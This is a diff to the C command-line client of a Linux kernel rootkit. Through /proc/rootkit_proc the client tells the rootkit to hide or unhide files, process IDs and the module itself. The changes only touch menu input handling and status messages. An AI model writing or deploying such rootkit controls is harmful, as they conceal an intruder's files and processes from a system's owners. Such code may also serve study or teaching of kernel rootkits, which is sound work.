@@ -21,8 +21,9 @@ void display_intro(void){
 int get_option(void){
 	char c;
 	printf("Select an option: ");
-	c = fgetc(stdin);
-	fgetc(stdin);
+	do {
+		c = fgetc(stdin);
+	} while (c == '\n');
 	return c - '0';
 }
 
@@ -59,22 +60,18 @@ void send_msg_id(int id, int fd){
 
 void hide_file(int fd){
 	send_msg_file(1, fd);
-	printf("File hidden successfully!\n");
 }
 
 void unhide_file(int fd){
 	send_msg_file(2, fd);
-	printf("File unhidden successfully!\n");
 }
 
 void hide_pid(int fd){
 	send_msg_pid(3, fd);
-	printf("PID hidden successfully!\n");
 }
 
 void unhide_pid(int fd){
 	send_msg_pid(4, fd);
-	printf("PID unhidden successfully!\n");
 }
 
 void see_hidden(int fd){
@@ -85,23 +82,22 @@ void see_hidden(int fd){
 
 void hide_module(int fd){
 	send_msg_id(6, fd);
-	printf("Module hidden\n");
 }
 
 void unhide_module(int fd){
 	send_msg_id(7, fd);
-	printf("Module unhidden\n");
 }
 
 int main(int argc, char** argv){
-	int fd;
+	int fd, correct;
 	if ((fd = open("/proc/rootkit_proc", O_WRONLY)) == -1){
-		printf("ERROR OPEN\n");
+		printf("ERROR OPEN: Is the rootkit running?\n");
 		return -1;
 	}
 	printf("Welcome!\n");
 
 	while (1){
+		correct = 1;
 		display_intro();
 		int option = get_option();
 		switch (option){
@@ -127,9 +123,12 @@ int main(int argc, char** argv){
 				unhide_module(fd);
 				break;
 			default:
-				printf("Wrong option.\n");
+				correct = 0;
 		}
-		printf("\n");
+		if (correct)
+			printf("Done\n\n");
+		else
+			printf("Wrong option.\n\n");
 	}
 	close(fd);
 	return 0;
